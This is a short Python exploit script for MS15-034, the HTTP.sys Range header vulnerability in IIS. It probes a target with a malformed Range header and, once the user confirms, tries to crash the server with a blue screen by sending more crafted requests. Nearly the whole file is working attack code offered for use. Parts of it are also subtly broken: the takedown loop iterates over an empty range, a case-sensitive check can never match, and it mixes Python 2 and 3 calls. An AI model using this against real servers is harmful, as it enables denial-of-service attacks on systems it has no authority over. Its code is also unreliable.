#!/usr/bin/python
# Exploit MS15-034 like a boss. USE WITH PERMISSION AND CAUTION!!!

import socket
import sys

# Check to make sure we have a target
if len(sys.argv) <= 1:
    print("I need a hostname or IP address!")
    sys.exit()

# convert the target to an IP address and bind to target variable
tgt = sys.argv[1]
try:
    socket.inet_aton(tgt)
    target = tgt
except socket.error:
    target = socket.gethostbyname(tgt)


# This is the generic socket object that sends the exploit
def exploit(payload, victim):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((victim, 80))
    s.send(payload)
    resp = s.recv(1024)
    s.close()
    return resp


# This function takes down a vulnerable server.
def takedown():
    for i in range(18-25):
        # iterate through a range from 18-25 to actually exploit the vuln with extreme prejudice
        nosebleed = "GET / HTTP/1.1\r\nHost: blah\r\nRange: bytes=%s-18446744073709551615\r\n\r\n" % str(i)
        exploit(nosebleed, target)


# Check for the vulnerability and exploit it if you wish
knockknock = "GET / HTTP/1.1\r\nHost: blah\r\nRange: bytes=0-18446744073709551615\r\n\r\n"
check = exploit(knockknock, target)
if "requested range not satisfiable" in check.lower():
    doit = raw_input("They're vulnerable! Paint the window a pretty blue!?")
    if "y" in doit.lower():
        print("[+] Get ready for the boomsauce!")
        takedown()
    else:
        print("How nice of you to spare them! :)")
        sys.exit()
elif "The request has an invalid header name" in check.lower():
    print("Looks like their sysadmins and security team are on top of it! It's patched!")
    sys.exit()




